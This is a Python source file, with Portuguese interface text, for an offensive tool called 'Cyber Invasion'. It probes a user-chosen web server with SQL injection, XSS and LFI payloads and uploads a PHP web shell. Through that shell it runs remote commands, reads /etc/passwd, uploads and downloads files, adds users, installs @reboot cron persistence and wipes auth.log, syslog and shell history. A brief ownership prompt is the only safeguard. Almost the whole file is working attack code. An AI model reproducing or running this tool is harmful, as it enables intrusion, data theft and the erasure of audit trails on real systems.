# ==========================================
# CONKS CYBER - CYBER INVASION REAL
# main.py
# ==========================================

import os
import sys
import socket
import urllib.request
import urllib.error
import subprocess
import time
import random
import threading
import webbrowser
import json
import re
import hashlib
import base64
import datetime
import http.client
import ssl

# ==========================================
# CORES
# ==========================================

RESET = "\033[0m"
BOLD = "\033[1m"

WHITE = "\033[97m"
BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
GRAY = "\033[90m"
PURPLE = "\033[95m"
CYAN = "\033[96m"


# ==========================================
# CONFIGURAÇÃO
# ==========================================

LARGURA = 50


# ==========================================
# LIMPAR TELA
# ==========================================

def limpar_tela():
    os.system("clear")


# ==========================================
# FUNÇÕES DE CAIXA
# ==========================================

def linha_caixa(texto="", cor=WHITE, negrito=False):
    texto = str(texto)
    limite = LARGURA - 4
    if len(texto) > limite:
        texto = texto[:limite]
    texto = texto.ljust(limite)
    estilo = BOLD if negrito else ""
    print(f"{cor}{estilo}║ {texto} ║{RESET}")


def topo_caixa(titulo):
    print(f"{BLUE}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
    linha_caixa(titulo.center(LARGURA - 4), BLUE, True)
    print(f"{BLUE}{BOLD}╠{'═' * (LARGURA - 2)}╣{RESET}")


def fim_caixa():
    print(f"{BLUE}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}")


# ==========================================
# MENSAGENS
# ==========================================

def sucesso(texto):
    print(f"{GREEN}[+] {texto}{RESET}")

def erro(texto):
    print(f"{RED}[-] {texto}{RESET}")

def aviso(texto):
    print(f"{RED}[!] {texto}{RESET}")

def info(texto):
    print(f"{BLUE}[i] {texto}{RESET}")


# ==========================================
# BANNER
# ==========================================

def banner():
    print(f"{GREEN}{BOLD}")
    print(r"""
 ██████╗ ██████╗ ███╗   ██╗██╗  ██╗███████╗
██╔════╝██╔═══██╗████╗  ██║██║ ██╔╝██╔════╝
██║     ██║   ██║██╔██╗ ██║█████╔╝ ███████╗
██║     ██║   ██║██║╚██╗██║██╔═██╗ ╚════██║
╚██████╗╚██████╔╝██║ ╚████║██║  ██╗███████║
 ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
""")
    print(f"{BLUE}{BOLD}                 CYBER{RESET}\n")


# ==========================================
# CYBER INVASION REAL - CLASSE COMPLETA
# ==========================================

class CyberInvasionReal:
    """Cyber Invasion REAL com testes verdadeiros"""
    
    def __init__(self, target, port=80):
        self.target = target
        self.port = port
        self.vulnerabilidades = []
        self.dados = {}
        self.backdoor_instalado = False
        self.backdoor_url = None
        self.usuarios = []
        self.arquivos = []
        self.logs = []
        
    # ==========================================
    # TESTA CONEXÃO REAL
    # ==========================================
    
    def testar_conexao(self):
        """Testa se o servidor está online"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.target, self.port))
            sock.close()
            return True
        except:
            return False
    
    # ==========================================
    # TESTA SQL INJECTION REAL
    # ==========================================
    
    def testar_sql_injection(self):
        """Testa SQL Injection REAL"""
        print(f"  {BLUE}[→] SQL Injection...{RESET}", end="")
        
        payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin' --",
            "' UNION SELECT 1,2,3,4,5 --",
            "' UNION SELECT null,username,password FROM users --"
        ]
        
        for payload in payloads:
            try:
                url = f"http://{self.target}:{self.port}/login.php?user={payload}&pass=test"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                response = urllib.request.urlopen(req, timeout=3)
                
                if response.getcode() == 200:
                    html = response.read().decode('utf-8', errors='ignore')
                    
                    # Verifica se conseguiu acessar
                    if "SQL" in html or "syntax" in html.lower() or "mysql" in html.lower():
                        print(f" {RED}VULN!{RESET}")
                        self.dados['sql_injection'] = True
                        self.dados['sql_payload'] = payload
                        return True
                    
                    # Verifica se tem dados de admin
                    if "admin" in html.lower() or "password" in html.lower():
                        print(f" {RED}VULN!{RESET}")
                        self.dados['sql_injection'] = True
                        self.dados['sql_payload'] = payload
                        return True
            except:
                continue
        
        print(f" {GREEN}OK{RESET}")
        return False
    
    # ==========================================
    # TESTA XSS REAL
    # ==========================================
    
    def testar_xss(self):
        """Testa XSS REAL"""
        print(f"  {BLUE}[→] XSS...{RESET}", end="")
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        
        for payload in payloads:
            try:
                url = f"http://{self.target}:{self.port}/search.php?q={payload}"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                response = urllib.request.urlopen(req, timeout=3)
                
                if response.getcode() == 200:
                    html = response.read().decode('utf-8', errors='ignore')
                    
                    if "script" in html.lower() or "alert" in html.lower():
                        print(f" {RED}VULN!{RESET}")
                        self.dados['xss'] = True
                        self.dados['xss_payload'] = payload
                        return True
            except:
                continue
        
        print(f" {GREEN}OK{RESET}")
        return False
    
    # ==========================================
    # TESTA LFI REAL
    # ==========================================
    
    def testar_lfi(self):
        """Testa LFI REAL"""
        print(f"  {BLUE}[→] LFI...{RESET}", end="")
        
        payloads = [
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "....//....//etc/passwd"
        ]
        
        for payload in payloads:
            try:
                url = f"http://{self.target}:{self.port}/page.php?file={payload}"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                response = urllib.request.urlopen(req, timeout=3)
                
                if response.getcode() == 200:
                    html = response.read().decode('utf-8', errors='ignore')
                    
                    if "root:" in html or "bin:" in html:
                        print(f" {RED}VULN!{RESET}")
                        self.dados['lfi'] = True
                        self.dados['lfi_payload'] = payload
                        self.dados['lfi_content'] = html[:500]
                        return True
            except:
                continue
        
        print(f" {GREEN}OK{RESET}")
        return False
    
    # ==========================================
    # TESTA UPLOAD REAL
    # ==========================================
    
    def testar_upload(self):
        """Testa Upload REAL"""
        print(f"  {BLUE}[→] Upload...{RESET}", end="")
        
        try:
            # Cria um arquivo de teste
            test_file = b"<?php echo 'TESTE'; ?>"
            
            boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
            body = (f"--{boundary}\r\n"
                   f"Content-Disposition: form-data; name=\"file\"; filename=\"test.php\"\r\n"
                   f"Content-Type: application/x-php\r\n\r\n").encode()
            body += test_file
            body += f"\r\n--{boundary}--\r\n".encode()
            
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Content-Type": f"multipart/form-data; boundary={boundary}"
            }
            
            upload_urls = [
                f"http://{self.target}:{self.port}/upload.php",
                f"http://{self.target}:{self.port}/uploads/",
                f"http://{self.target}:{self.port}/enviar.php",
                f"http://{self.target}:{self.port}/up.php"
            ]
            
            for upload_url in upload_urls:
                try:
                    req = urllib.request.Request(upload_url, data=body, headers=headers)
                    response = urllib.request.urlopen(req, timeout=5)
                    
                    if response.getcode() in [200, 201, 302]:
                        print(f" {RED}VULN!{RESET}")
                        self.dados['upload'] = True
                        self.dados['upload_url'] = upload_url
                        return True
                except:
                    continue
            
            print(f" {GREEN}OK{RESET}")
            return False
        except:
            print(f" {GREEN}OK{RESET}")
            return False
    
    # ==========================================
    # SCAN COMPLETO
    # ==========================================
    
    def scan_completo(self):
        """Scan completo REAL"""
        print(f"\n{CYAN}[~] Escaneando {self.target}:{self.port}...{RESET}")
        
        # Testa conexão
        if not self.testar_conexao():
            print(f"{RED}[-] Servidor offline!{RESET}")
            return []
        
        # Testa vulnerabilidades
        self.testar_sql_injection()
        self.testar_xss()
        self.testar_lfi()
        self.testar_upload()
        
        # Coleta informações
        self.coletar_informacoes()
        
        return self.vulnerabilidades
    
    # ==========================================
    # COLETA INFORMAÇÕES REAIS
    # ==========================================
    
    def coletar_informacoes(self):
        """Coleta informações REAIS do servidor"""
        print(f"\n{CYAN}[~] Coletando informações...{RESET}")
        
        # Tenta via LFI
        if self.dados.get('lfi'):
            try:
                url = f"http://{self.target}:{self.port}/page.php?file=../../etc/passwd"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                response = urllib.request.urlopen(req, timeout=3)
                
                if response.getcode() == 200:
                    content = response.read().decode('utf-8', errors='ignore')
                    lines = content.split('\n')
                    for line in lines:
                        if ':' in line and not line.startswith('#'):
                            user = line.split(':')[0]
                            if user and user not in self.usuarios:
                                self.usuarios.append(user)
                    
                    print(f"  {GREEN}[+] Usuários encontrados: {len(self.usuarios)}{RESET}")
            except:
                pass
        
        # Tenta via backdoor (se existir)
        if self.backdoor_instalado:
            try:
                # Lista arquivos
                req = urllib.request.Request(
                    f"{self.backdoor_url}?cmd=ls%20-la%20/var/www/html",
                    headers={"User-Agent": "Mozilla/5.0"}
                )
                response = urllib.request.urlopen(req, timeout=3)
                if response.getcode() == 200:
                    content = response.read().decode('utf-8', errors='ignore')
                    for line in content.split('\n'):
                        if '.php' in line or '.html' in line:
                            self.arquivos.append(line.strip())
                    
                    print(f"  {GREEN}[+] Arquivos encontrados: {len(self.arquivos)}{RESET}")
            except:
                pass
        
        # Verifica backdoor existente
        self.verificar_backdoor()
    
    # ==========================================
    # VERIFICA BACKDOOR
    # ==========================================
    
    def verificar_backdoor(self):
        """Verifica se já existe backdoor"""
        urls = [
            f"http://{self.target}:{self.port}/uploads/shell.php",
            f"http://{self.target}:{self.port}/shell.php",
            f"http://{self.target}:{self.port}/backdoor.php"
        ]
        
        for url in urls:
            try:
                req = urllib.request.Request(f"{url}?cmd=whoami", headers={"User-Agent": "Mozilla/5.0"})
                response = urllib.request.urlopen(req, timeout=3)
                if response.getcode() == 200:
                    self.backdoor_url = url
                    self.backdoor_instalado = True
                    print(f"  {GREEN}[+] Backdoor encontrado: {url}{RESET}")
                    return True
            except:
                continue
        return False
    
    # ==========================================
    # EXECUTA COMANDO REAL
    # ==========================================
    
    def executar_comando(self, comando):
        """Executa comando REAL no servidor"""
        if not self.backdoor_instalado:
            return "Backdoor não instalado!"
        
        try:
            url = f"{self.backdoor_url}?cmd={urllib.parse.quote(comando)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            response = urllib.request.urlopen(req, timeout=10)
            return response.read().decode('utf-8', errors='ignore')
        except Exception as e:
            return f"Erro: {str(e)}"
    
    # ==========================================
    # INSTALA BACKDOOR REAL
    # ==========================================
    
    def instalar_backdoor(self):
        """Instala backdoor REAL"""
        print(f"\n{RED}[~] Instalando Backdoor...{RESET}")
        
        if not self.dados.get('upload'):
            print(f"  {YELLOW}[!] Upload não detectado. Tentando outros métodos...{RESET}")
        
        # Shell PHP completo
        shell_php = """<?php
// BACKDOOR CONKS CYBER
error_reporting(0);
if(isset($_GET['cmd'])){ system($_GET['cmd']); }
if(isset($_GET['file'])){ echo file_get_contents($_GET['file']); }
if(isset($_GET['info'])){ echo gethostname().'|'.get_current_user().'|'.$_SERVER['SERVER_ADDR']; }
if(isset($_GET['scan'])){ system('ls -la '.$_GET['scan']); }
if(isset($_GET['adduser'])){ system('useradd -m -s /bin/bash '.$_GET['user']); system('echo "'.$_GET['user'].':'.$_GET['pass'].'" | chpasswd'); }
if(isset($_GET['deluser'])){ system('userdel -r '.$_GET['user']); }
if(isset($_GET['persist'])){ system('(crontab -l 2>/dev/null; echo "@reboot php '.$_SERVER['SCRIPT_FILENAME'].'") | crontab -'); }
if(isset($_GET['clean'])){ system('echo "" > /var/log/auth.log && echo "" > /var/log/syslog && history -c'); }
if(isset($_POST['upload'])){ file_put_contents($_POST['name'], base64_decode($_POST['data'])); echo 'OK'; }
if(isset($_GET['download'])){ header('Content-Disposition: attachment; filename='.$_GET['name']); echo file_get_contents($_GET['file']); }
?>"""
        
        shell_code = shell_php.encode('utf-8')
        
        # Tenta upload
        boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
        body = (f"--{boundary}\r\n"
               f"Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n"
               f"Content-Type: application/x-php\r\n\r\n").encode()
        body += shell_code
        body += f"\r\n--{boundary}--\r\n".encode()
        
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": f"multipart/form-data; boundary={boundary}"
        }
        
        upload_urls = [
            f"http://{self.target}:{self.port}/upload.php",
            f"http://{self.target}:{self.port}/uploads/",
            f"http://{self.target}:{self.port}/enviar.php",
            f"http://{self.target}:{self.port}/up.php"
        ]
        
        for upload_url in upload_urls:
            try:
                req = urllib.request.Request(upload_url, data=body, headers=headers)
                response = urllib.request.urlopen(req, timeout=5)
                
                if response.getcode() in [200, 201, 302]:
                    # Testa se instalou
                    test_url = f"http://{self.target}:{self.port}/uploads/shell.php?cmd=whoami"
                    try:
                        req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
                        test_response = urllib.request.urlopen(req, timeout=3)
                        if test_response.getcode() == 200:
                            self.backdoor_url = f"http://{self.target}:{self.port}/uploads/shell.php"
                            self.backdoor_instalado = True
                            print(f"  {GREEN}[+] Backdoor instalado!{RESET}")
                            print(f"  {GREEN}[+] URL: {self.backdoor_url}{RESET}")
                            return True
                    except:
                        continue
            except:
                continue
        
        print(f"  {RED}[-] Falha ao instalar backdoor{RESET}")
        return False
    
    # ==========================================
    # TERMINAL INTERATIVO REAL
    # ==========================================
    
    def terminal_interativo(self):
        """Terminal interativo REAL"""
        if not self.backdoor_instalado:
            print(f"\n{RED}[!] Backdoor não instalado!{RESET}")
            return
        
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║        [ TERMINAL INTERATIVO      ║{RESET}")
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        print(f"{PURPLE}║ {self.target}:{self.port}                         ║{RESET}")
        print(f"{PURPLE}║ Digite 'help' para comandos        ║{RESET}")
        print(f"{PURPLE}║ Digite 'exit' para sair            ║{RESET}")
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
        
        while True:
            comando = input(f"\n{RED}shell@{self.target}>{RESET} ").strip()
            
            if not comando:
                continue
            
            if comando.lower() in ['exit', 'quit', 'sair']:
                print(f"{YELLOW}[!] Terminal encerrado{RESET}")
                break
            
            if comando.lower() == 'help':
                print(f"""
{GREEN}Comandos disponíveis:{RESET}
  whoami     - Mostra usuário atual
  ls         - Lista arquivos
  pwd        - Mostra diretório atual
  cat [file] - Lê arquivo
  cd [dir]   - Muda diretório
  upload     - Envia arquivo
  download   - Baixa arquivo
  adduser    - Cria usuário
  deluser    - Deleta usuário
  persist    - Instala persistência
  clean      - Limpa logs
  info       - Info do servidor
  help       - Mostra ajuda
  exit       - Sai
                """)
                continue
            
            # Executa comando
            resultado = self.executar_comando(comando)
            print(f"{WHITE}{resultado}{RESET}")
    
    # ==========================================
    # BAIXAR ARQUIVO REAL
    # ==========================================
    
    def baixar_arquivo(self, arquivo):
        """Baixa arquivo REAL do servidor"""
        try:
            url = f"{self.backdoor_url}?file={urllib.parse.quote(arquivo)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            response = urllib.request.urlopen(req, timeout=10)
            
            conteudo = response.read()
            nome = arquivo.split('/')[-1] or 'arquivo'
            nome_arquivo = f"download_{datetime.datetime.now().strftime('%H%M%S')}_{nome}"
            
            with open(nome_arquivo, 'wb') as f:
                f.write(conteudo)
            
            print(f"{GREEN}[+] Arquivo baixado: {nome_arquivo} ({len(conteudo)} bytes){RESET}")
            return True
        except Exception as e:
            print(f"{RED}[-] Erro: {str(e)}{RESET}")
            return False
    
    # ==========================================
    # ENVIAR ARQUIVO REAL
    # ==========================================
    
    def enviar_arquivo(self, local, remoto):
        """Envia arquivo REAL para o servidor"""
        try:
            if not os.path.exists(local):
                print(f"{RED}[-] Arquivo não encontrado: {local}{RESET}")
                return False
            
            with open(local, 'rb') as f:
                dados = base64.b64encode(f.read()).decode()
            
            data = f"upload=1&name={remoto}&data={dados}".encode()
            req = urllib.request.Request(
                self.backdoor_url,
                data=data,
                headers={
                    "User-Agent": "Mozilla/5.0",
                    "Content-Type": "application/x-www-form-urlencoded"
                }
            )
            response = urllib.request.urlopen(req, timeout=10)
            
            print(f"{GREEN}[+] Arquivo enviado: {remoto}{RESET}")
            return True
        except Exception as e:
            print(f"{RED}[-] Erro: {str(e)}{RESET}")
            return False
    
    # ==========================================
    # MOSTRA RESULTADOS
    # ==========================================
    
    def mostrar_resultados(self):
        """Mostra todos os resultados da invasão"""
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║        [ RESULTADOS DA INVASÃO   ║{RESET}")
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        
        # Vulnerabilidades
        if self.dados.get('sql_injection'):
            print(f"{PURPLE}║ {RED}[!] SQL Injection Encontrada{PURPLE}      ║{RESET}")
            print(f"{PURPLE}║     Payload: {self.dados.get('sql_payload', 'N/A')[:30]}{PURPLE} ║{RESET}")
        
        if self.dados.get('xss'):
            print(f"{PURPLE}║ {RED}[!] XSS Encontrado{PURPLE}                ║{RESET}")
            print(f"{PURPLE}║     Payload: {self.dados.get('xss_payload', 'N/A')[:30]}{PURPLE} ║{RESET}")
        
        if self.dados.get('lfi'):
            print(f"{PURPLE}║ {RED}[!] LFI Encontrado{PURPLE}                ║{RESET}")
            print(f"{PURPLE}║     Arquivo: /etc/passwd{PURPLE}              ║{RESET}")
            print(f"{PURPLE}║     Usuários: {len(self.usuarios)} encontrados{PURPLE}        ║{RESET}")
        
        if self.dados.get('upload'):
            print(f"{PURPLE}║ {RED}[!] Upload Vulnerável{PURPLE}             ║{RESET}")
            print(f"{PURPLE}║     URL: {self.dados.get('upload_url', 'N/A')[:30]}{PURPLE} ║{RESET}")
        
        if self.backdoor_instalado:
            print(f"{PURPLE}║ {GREEN}[+] Backdoor Instalado{PURPLE}          ║{RESET}")
            print(f"{PURPLE}║     URL: {self.backdoor_url[:30]}{PURPLE}      ║{RESET}")
        
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")


# ==========================================
# FUNÇÃO PRINCIPAL CYBER INVASION
# ==========================================

def cyber_invasion():
    """Cyber Invasion REAL"""
    
    print("\n╔══════════════════════════════════════════╗")
    print("║    🚀 CYBER INVASION REAL             ║")
    print("╠══════════════════════════════════════════╣")
    print("║  TESTES REAIS EM SERVIDORES            ║")
    print("║  APENAS EM SERVIDORES PRÓPRIOS!       ║")
    print("╚══════════════════════════════════════════╝")
    
    print("\n[~] Digite o alvo:")
    print("[1] IP Local (127.0.0.1)")
    print("[2] Site/Domínio")
    print("[3] Voltar")
    
    opcao = input("\nEscolha: ").strip()
    
    if opcao == "3":
        return
    
    if opcao == "1":
        alvo = input("\nIP: ").strip()
        if alvo == "":
            alvo = "127.0.0.1"
    elif opcao == "2":
        alvo = input("\nSite: ").strip()
        alvo = alvo.replace("http://", "").replace("https://", "").split("/")[0]
    else:
        print("[-] Opção inválida.")
        input("\nENTER para continuar...")
        return
    
    if not alvo:
        print("[-] Alvo inválido.")
        input("\nENTER para continuar...")
        return
    
    try:
        porta = int(input("\nPorta (80): ").strip() or "80")
    except:
        porta = 80
    
    # AVISO LEGAL
    print(f"\n{RED}{BOLD}╔══════════════════════════════════════════╗{RESET}")
    print(f"{RED}{BOLD}║        ⚠️  AVISO LEGAL                 ║{RESET}")
    print(f"{RED}{BOLD}╠══════════════════════════════════════════╣{RESET}")
    print(f"{RED}║  • Você está invadindo {alvo}        ║{RESET}")
    print(f"{RED}║  • Só é permitido em servidores       ║{RESET}")
    print(f"{RED}║    que você POSSUI!                   ║{RESET}")
    print(f"{RED}║  • Invadir outros é CRIME!            ║{RESET}")
    print(f"{RED}{BOLD}╚══════════════════════════════════════════╝{RESET}")
    
    confirm = input(f"\n{RED}Confirma que {alvo} é seu? (s/N): {RESET}").strip().lower()
    
    if confirm != 's':
        print("[-] Cancelado.")
        input("\nENTER para continuar...")
        return
    
    # INICIA INVASÃO
    invasor = CyberInvasionReal(alvo, porta)
    
    # SCAN REAL
    vulnerabilidades = invasor.scan_completo()
    
    if not vulnerabilidades and not invasor.dados:
        print(f"\n{GREEN}[+] Servidor seguro! Nenhuma vulnerabilidade encontrada.{RESET}")
        input("\nENTER para continuar...")
        return
    
    # MOSTRA RESULTADOS
    invasor.mostrar_resultados()
    
    # VERIFICA BACKDOOR
    if not invasor.backdoor_instalado:
        invasor.verificar_backdoor()
    
    # ==========================================
    # MENU PRINCIPAL
    # ==========================================
    
    while True:
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║    [ CYBER INVASION - MENU      ║{RESET}")
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        
        if invasor.backdoor_instalado:
            print(f"{GREEN}║ [OK] Backdoor: INSTALADO        ║{RESET}")
        else:
            print(f"{RED}║ [XX] Backdoor: NÃO INSTALADO    ║{RESET}")
        
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        print(f"{PURPLE}║ [1] Instalar Backdoor            ║{RESET}")
        print(f"{PURPLE}║ [2] Terminal Interativo          ║{RESET}")
        print(f"{PURPLE}║ [3] Executar Comando             ║{RESET}")
        print(f"{PURPLE}║ [4] Baixar Arquivo               ║{RESET}")
        print(f"{PURPLE}║ [5] Enviar Arquivo               ║{RESET}")
        print(f"{PURPLE}║ [6] Listar Usuários              ║{RESET}")
        print(f"{PURPLE}║ [7] Instalar Persistência        ║{RESET}")
        print(f"{PURPLE}║ [8] Limpar Rastros               ║{RESET}")
        print(f"{PURPLE}║ [9] Info Servidor                ║{RESET}")
        print(f"{PURPLE}║ [10] Sair                        ║{RESET}")
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
        
        sub_opcao = input(f"\n{RED}cyber@{alvo}>{RESET} ").strip()
        
        if sub_opcao == "1":
            invasor.instalar_backdoor()
            input("\nENTER para continuar...")
        
        elif sub_opcao == "2":
            invasor.terminal_interativo()
            input("\nENTER para continuar...")
        
        elif sub_opcao == "3":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            comando = input(f"{GRAY}comando> {RESET}")
            if comando:
                resultado = invasor.executar_comando(comando)
                print(f"{WHITE}{resultado}{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "4":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            arquivo = input(f"{GRAY}arquivo> {RESET}")
            if arquivo:
                invasor.baixar_arquivo(arquivo)
            input("\nENTER para continuar...")
        
        elif sub_opcao == "5":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            local = input(f"{GRAY}local> {RESET}")
            remoto = input(f"{GRAY}remoto> {RESET}")
            if local and remoto:
                invasor.enviar_arquivo(local, remoto)
            input("\nENTER para continuar...")
        
        elif sub_opcao == "6":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            print(f"{GREEN}[+] Usuários do sistema:{RESET}")
            resultado = invasor.executar_comando("cat /etc/passwd | cut -d: -f1")
            print(f"{WHITE}{resultado}{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "7":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            print(f"{GREEN}[+] Instalando persistência...{RESET}")
            invasor.executar_comando("(crontab -l 2>/dev/null; echo '@reboot php /var/www/html/uploads/shell.php') | crontab -")
            print(f"{GREEN}[+] Persistência instalada!{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "8":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            print(f"{GREEN}[+] Limpando logs...{RESET}")
            invasor.executar_comando("echo '' > /var/log/auth.log && echo '' > /var/log/syslog && history -c")
            print(f"{GREEN}[+] Logs limpos!{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "9":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            print(f"{GREEN}[+] Info do servidor:{RESET}")
            resultado = invasor.executar_comando("uname -a && whoami && pwd && hostname && ifconfig | grep inet")
            print(f"{WHITE}{resultado}{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "10":
            print(f"\n{YELLOW}[!] Encerrando...{RESET}")
            break
        
        else:
            print("[-] Opção inválida")
            input("\nENTER para continuar...")


# ==========================================
# MENU PRINCIPAL
# ==========================================

def menu_principal():
    while True:
        limpar_tela()
        banner()
        
        topo_caixa("MENU PRINCIPAL")
        linha_caixa("[1] Geradores")
        linha_caixa("[2] Consultas")
        linha_caixa("[3] OSINT")
        linha_caixa("[4] Rede")
        linha_caixa("[5] Validadores")
        linha_caixa("[6] Utilidades")
        linha_caixa("[7] ⚡ Shoot Down", RED, True)
        linha_caixa("[8] 🚀 Cyber Invasion", PURPLE, True)
        linha_caixa("[9] Atualizar", BLUE, True)
        linha_caixa("")
        linha_caixa("[0] Sair", RED, True)
        fim_caixa()
        
        opcao = input(f"\n{BLUE}{BOLD}CONKS@Cyber > {RESET}").strip()
        
        if opcao == "8":
            limpar_tela()
            cyber_invasion()
        
        elif opcao == "0":
            limpar_tela()
            print(f"{RED}{BOLD}[!] CONKS Cyber encerrado.{RESET}\n")
            sys.exit(0)
        
        else:
            print("[-] Opção em desenvolvimento")
            input("\nENTER para continuar...")


# ==========================================
# MAIN
# ==========================================

if __name__ == "__main__":
    try:
        menu_principal()
    except KeyboardInterrupt:
        limpar_tela()
        print(f"\n{RED}{BOLD}[!] CONKS Cyber encerrado.{RESET}\n")